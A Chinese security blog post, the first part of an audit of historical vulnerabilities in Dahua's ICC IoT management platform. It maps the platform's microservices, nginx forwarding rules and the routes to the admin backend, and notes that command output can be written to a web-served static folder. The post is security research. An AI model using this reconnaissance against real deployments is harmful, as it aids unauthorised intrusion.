@@ -1,0 +1,1083 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            某华ICC智能物联综合管理平台历史漏洞分析（一）——从两层接口转发到漏洞利用 |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        某华ICC智能物联综合管理平台历史漏洞分析（一）——从两层接口转发到漏洞利用
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv5</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2026-04-16 21:56:21</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Thu Apr 16 2026 21:59:43 GMT+0800">2026-04-16 21:59:43</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>7.8k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>36 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p>本文仅用于网络安全研究与技术交流目的，所涉及的技术、方法及示例仅限于在合法授权的环境下进行测试与学习。严禁将本文内容用于任何未授权的攻击行为或非法用途。因读者不当使用本文内容而造成的任何直接或间接后果，均由使用者自行承担，作者不承担任何责任。请在遵守相关法律法规及道德规范的前提下开展安全研究工作。</p>
+<p>由于笔者水平有限，文中难免存在不足，欢迎指正与交流。  </p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次来看看大华ICC。这是第一个接触到的微服务系统，还有个nginx网关，所以在接口转发关系上花费了不少时间，远程调试也是踩坑不少，故写笔记分享，希望能帮大家节约一点时间。</p>
+<p>本文目标：</p>
+<p>1、了解大华ICC的项目结构</p>
+<p>2、分析在nginx层的接口转发</p>
+<p>3、分析evo-apigw微服务如何进行网关转发，微服务如何在evo-discover中注册，evo-oauth怎么进行认证</p>
+<p>4、对evo-apigw系列的微服务和evo-runs分别进行鉴权分析</p>
+<p>5、对4个历史漏洞进行分析</p>
+<p>6、盘点过程中的疑难杂症</p>
+<p>部分文档见：<a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/tree/main/CodeAudit/%E5%A4%A7%E5%8D%8EICC%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0" >https://github.com/1diot9/MyJavaSecStudy/tree/main/CodeAudit/%E5%A4%A7%E5%8D%8EICC%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0<i class="fas fa-external-link-alt"></i></a></p>
+<p>让我们开始吧。</p>
+<h1 id="项目分析"><a href="#项目分析" class="headerlink" title="项目分析"></a>项目分析</h1><p>大华ICC的结构相对复杂一些，这里只分析我认为比较重要的。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775612489713-ea4b8dd4-a959-4978-8064-b91b745edd54.png"  alt="img"></p>
+<p>3rdtool是第三方的软件，比如nginx，rabbitmq：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775615399734-67379cef-99fb-4751-b022-28be64359e2d.png"  alt="img"></p>
+<p>evo是核心源码，存放了各个模块。</p>
+<p>evoWpms是静态资源的存放目录，由evo&#x2F;evo-web部署，其在nginx有配置，可以通过 <a class="link"   target="_blank" rel="noopener" href="https://xxx/static/xxx%E7%9A%84%E6%96%B9%E5%BC%8F%EF%BC%8C%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE%E5%88%B0%E9%87%8C%E9%9D%A2%E7%9A%84%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%EF%BC%8C%E5%90%8E%E9%9D%A2%E4%BC%9A%E8%AE%B2%E3%80%82" >https://xxx/static/xxx的方式，直接访问到里面的静态资源，后面会讲。<i class="fas fa-external-link-alt"></i></a></p>
+<p>详细看看evo：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775613264898-d342479b-ab9d-43e4-a044-ba495a9c92b5.png"  alt="img"></p>
+<p>evo-common是主要业务目录，存放了各个微服务</p>
+<p>evo-subsystem是子系统，主要是视频监控系统的各个服务，且主要都是二进制程序</p>
+<p>evo-web是前端模块安装包，只起到备份作用，实际都安装到了evoWpms目录中</p>
+<p>看一下evo-common：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775613906567-a8c6abfc-ae60-402a-a596-ce97efd0f151.png"  alt="img"></p>
+<p>evo开头的，每个都对应一个微服务。</p>
+<p>evo-apigw做网关，复制分发部分请求。evo-discover起到注册中心和服务发现的作用。evo-oauth是基于oauth2的认证服务，经过apigw，且不在白名单的接口，都需要经过oauth2认证。evo-runs模块是后台配置中心专用的服务，不走apigw网关，有自己的一套鉴权。evo-arms与其他微服务不一样，启动的是一个go的二进制文件，而不是jar，该微服务不走oauth鉴权。其他微服务这里不展开了。</p>
+<hr>
+<p>看一下evo-subsystem：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775614535478-81e141a3-af13-48e0-9e15-f6df731bea44.png"  alt="img"></p>
+<p>进Evo-video：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775614562261-d43a1e2f-a5e0-4df1-a13d-4f63d6883418.png"  alt="img"></p>
+<p>这里是视频监控系统的各个服务，除了admin模块外，其他都是二进制文件启动的。</p>
+<hr>
+<p>看一下evo-web：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775614998351-741fdb0f-60d2-4ac7-b970-1d0faeb67e19.png"  alt="img"></p>
+<p>再看看evoWpms：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775615245535-12b26cdd-81b9-4ca7-b9c6-1dac21c03643.png"  alt="img"></p>
+<p>可以看到是有一一对应关系的，其中Evo-web-oms对应config。</p>
+<p>至此，项目结构大致看完了，接下来看看nginx网关配置。</p>
+<h1 id="nginx网关"><a href="#nginx网关" class="headerlink" title="nginx网关"></a>nginx网关</h1><h2 id="nginx-conf"><a href="#nginx-conf" class="headerlink" title="nginx.conf"></a>nginx.conf</h2><p>先看总配置文件nginx.conf：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775617796781-b38ed16e-7d8e-4f69-a1d5-54aeb858ac3f.png"  alt="img"></p>
+<p>主要关注圈起来的文件。</p>
+<h2 id="upstream-conf"><a href="#upstream-conf" class="headerlink" title="upstream.conf"></a>upstream.conf</h2><p>upstream.conf：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775617836659-37ee2b16-3fad-4ba2-914c-c7d3638b96d7.png"  alt="img"></p>
+<p>这里设置了三个upstream名称，其中runs_backend在漏洞分析时会经常看到，因为对应的是evo-runs微服务：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775618037577-60ecd98f-e868-4605-9cbf-23a10b61d5a0.png"  alt="img"></p>
+<h2 id="web-local-runs-conf"><a href="#web-local-runs-conf" class="headerlink" title="web_local_runs.conf"></a>web_local_runs.conf</h2><p>web_local_runs.conf：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775618175075-36f9d43d-57f4-4bb0-bb62-d238fdb61f28.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775618602404-2e669572-9c2a-45fe-b140-ab9eb98d9e58.png"  alt="img"></p>
+<p>监听8005，location文件在location_runs.conf，看一下：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775618658514-760852a2-c903-4f63-989a-61c988b3b6fb.png"  alt="img"></p>
+<p>可以通过&#x2F;evo-runs的方式访问微服务，会转发到<a class="link"   target="_blank" rel="noopener" href="https://runs_backend,这个在upstream里有./" >https://runs_backend，这个在upstream里有。<i class="fas fa-external-link-alt"></i></a></p>
+<p>可以通过:8005&#x2F;config的方式，访问管理后台：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775618955950-e72da38e-7907-49a6-8ef7-c5d4773fa20a.png"  alt="img"></p>
+<h2 id="web-local-https-entry-conf"><a href="#web-local-https-entry-conf" class="headerlink" title="web_local_https_entry.conf"></a>web_local_https_entry.conf</h2><p>web_local_https_entry.conf：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775619044158-e6ca1d8a-c73f-4af3-8def-678f9e39cf3f.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775619065528-1ff6c5b3-0cb4-4081-9c4b-18378c7f929d.png"  alt="img"></p>
+<p>开在443端口，location文件在location_https.conf，看一下：</p>
+<p>这个文件很长，因为包含了从443端口访问的各种转发规则</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775619115998-1b2e33fa-48d7-4731-9289-32cbe7487f82.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775619246661-a3534721-95ce-4a4b-9ecc-70b3424da869.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775619183127-5fc771a5-33c1-423d-8074-8d5ea5e37b5e.png"  alt="img"></p>
+<p>能够看到&#x2F;brm&#x2F;和&#x2F;evo-apigw&#x2F;都被转发到<a class="link"   target="_blank" rel="noopener" href="https://hauc_backend/%EF%BC%9B%E5%90%8C%E6%97%B6%EF%BC%8C%E4%B9%9F%E6%9C%89%E4%B9%8B%E5%89%8D%E7%9A%84/evo-run/%EF%BC%8C%E6%89%80%E4%BB%A5%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BB%8E443%E7%AB%AF%E5%8F%A3%E8%AE%BF%E9%97%AE%E5%88%B0%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0%EF%BC%9A" >https://hauc_backend/；同时，也有之前的/evo-run/，所以也可以从443端口访问到管理后台：<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775619446901-14a67900-3c4a-4dd0-9a8f-2dfbd3326b00.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775641025332-27251a93-54c5-4b13-843d-39663e9f9539.png"  alt="img"></p>
+<p>另外能看到默认路径全部访问前端静态资源，对应文件路径在 &#x2F;opt&#x2F;evoWpms，所以后面经常能看见把命令执行结果写入&#x2F;opt&#x2F;evoWpms&#x2F;static&#x2F;xxx，然后通过<a class="link"   target="_blank" rel="noopener" href="https://xxxx/static/xxx%E5%8E%BB%E8%AE%BF%E9%97%AE%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E3%80%82" >https://xxxx/static/xxx去访问执行结果。<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="apigw系列"><a href="#apigw系列" class="headerlink" title="apigw系列"></a>apigw系列</h2><p>api&#x2F;evo_apigw.conf：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775619864390-050d87d0-6553-4a78-8a30-dd7b0af04532.png"  alt="img"></p>
+<p>定义了apigw的端口，即evo-apigw这个微服务。</p>
+<p>websocket&#x2F;keepalive_event_websocket.conf：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775619962695-26826c44-9f99-4a13-86b2-51844ce0dcee.png"  alt="img"></p>
+<p>websocket&#x2F;websocket_admin_backend.conf：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775619992965-4df13e7c-3089-4721-bd9f-5620f2772f48.png"  alt="img"></p>
+<p>http目录里是空的。</p>
+<p>至此，nginx网关的规则基本看完了。最后来总结一下所有的upstream名称：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#跳转服务器配置</span><br><span class="line">#运维管理</span><br><span class="line">upstream runs_backend &#123;</span><br><span class="line">    server 127.0.0.1:8006;</span><br><span class="line">    check interval=5000 rise=2 fall=5 timeout=1000 type=tcp default_down=false;</span><br><span class="line">    ip_hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#weboss</span><br><span class="line">upstream oss_backend &#123;</span><br><span class="line">    server 127.0.0.1:8927;</span><br><span class="line">    check interval=5000 rise=2 fall=5 timeout=1000 type=tcp default_down=false;</span><br><span class="line">    ip_hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#fsugw</span><br><span class="line">upstream fsugw_backend &#123;</span><br><span class="line">   server 127.0.0.1:9088;</span><br><span class="line">   check interval=5000 rise=2 fall=5 timeout=1000 type=tcp default_down=false;</span><br><span class="line">   ip_hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">upstream hauc_backend &#123; </span><br><span class="line">    server 192.168.131.46:8945 weight=1 max_fails=2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">upstream keepalive_event_websocket &#123;</span><br><span class="line">    server 192.168.131.46:8919;</span><br><span class="line">    keepalive 32;</span><br><span class="line">    ip_hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">upstream websocket_admin_backend &#123;</span><br><span class="line">    server 192.168.131.46:9407;</span><br><span class="line">    keepalive 32;</span><br><span class="line">    ip_hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以及一些重要的location：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#运维接口访问路由</span><br><span class="line">location ^~/evo-runs/ &#123;</span><br><span class="line">	#include mysite.rules;</span><br><span class="line">	proxy_pass  http://runs_backend;</span><br><span class="line">	proxy_set_header  Host $host;</span><br><span class="line">	proxy_set_header  X-Real-IP $remote_addr;</span><br><span class="line">	proxy_set_header  X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">	proxy_set_header  X-NET-FLAG $x_net_flag;</span><br><span class="line">	proxy_set_header  X-LC-MappingNet $x_lc_mapping_net;</span><br><span class="line">	proxy_send_timeout 1800;</span><br><span class="line">	proxy_read_timeout 1800;</span><br><span class="line">	proxy_ssl_ciphers ALL:!EXP:!NULL:!ADH:!LOW:!SSLv2:!SSLv3:!MD5:!RC4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#管理端接口对外访问路由</span><br><span class="line">location ^~ /evo-apigw/ &#123;</span><br><span class="line">        if ($deny_request) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">	proxy_set_header  X-Real-IP $remote_addr;</span><br><span class="line">	proxy_set_header  X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">	proxy_set_header  X-NET-FLAG $x_net_flag;</span><br><span class="line">	proxy_set_header  X-LC-MappingNet $x_lc_mapping_net;</span><br><span class="line">	proxy_send_timeout  600;</span><br><span class="line">	proxy_read_timeout  600;</span><br><span class="line">	set $rewriteFlag 0;</span><br><span class="line">	set $localHost $host;</span><br><span class="line">	if ($http_RewriteHost != &quot;&quot;) &#123;</span><br><span class="line">        set $rewriteFlag &quot;$&#123;rewriteFlag&#125;1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    set $testFlag 0;</span><br><span class="line">    set $testToken $http_authorization;</span><br><span class="line">    if ($http_x_subject_token != &quot;&quot;) &#123;</span><br><span class="line">        set $testFlag &quot;$&#123;testFlag&#125;1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($http_authorization = &quot;&quot;) &#123;</span><br><span class="line">        set $testFlag &quot;$&#123;testFlag&#125;1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($testFlag = &quot;011&quot;) &#123;</span><br><span class="line">        set $testToken $http_x_subject_token;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($http_Host != $http_RewriteHost) &#123;</span><br><span class="line">        set $rewriteFlag &quot;$&#123;rewriteFlag&#125;1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($rewriteFlag = &quot;011&quot;) &#123;</span><br><span class="line">        set $localHost $http_RewriteHost;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($rewriteFlag != &quot;011&quot;) &#123;</span><br><span class="line">        set $localHost $host:$server_port;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    proxy_set_header  authorization  $testToken;</span><br><span class="line">    proxy_set_header  Host $localHost;</span><br><span class="line"></span><br><span class="line">    if ($rewriteFlag = &quot;011&quot;) &#123;</span><br><span class="line">        proxy_pass  https://$http_RewriteHost:$http_RewritePort;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    proxy_pass https://hauc_backend/;</span><br><span class="line">    proxy_cookie_path  ~*/* /evo-apigw;</span><br><span class="line">    proxy_ssl_ciphers ALL:!EXP:!NULL:!ADH:!LOW:!SSLv2:!SSLv3:!MD5:!RC4;</span><br><span class="line"></span><br><span class="line">    proxy_intercept_errors on; # 允许Nginx拦截后端返回的错误代码</span><br><span class="line">    if ($request_uri ~* .*evo-oss.*) &#123;</span><br><span class="line">        error_page 302 = @handle_redirects_with_evo_pic; # 当接收到302状态码时，触发内部重定向到新的URL</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来要分析微服务网关evo-apigw是怎么进行转发的。</p>
+<h1 id="evo-apigw网关"><a href="#evo-apigw网关" class="headerlink" title="evo-apigw网关"></a>evo-apigw网关</h1><p>这里先给出一个最简单的，获取所有注册微服务的办法，需要在部署的机器上执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:8916/evo-discover/1.0.0/srd/subsystem</span><br><span class="line">curl http://127.0.0.1:8916/evo-discover/1.0.0/srd/version/list</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775620370924-640bb82a-26f7-4367-950a-0e8969617edf.png"  alt="img"></p>
+<p>第一个命令的结果整理一下：</p>
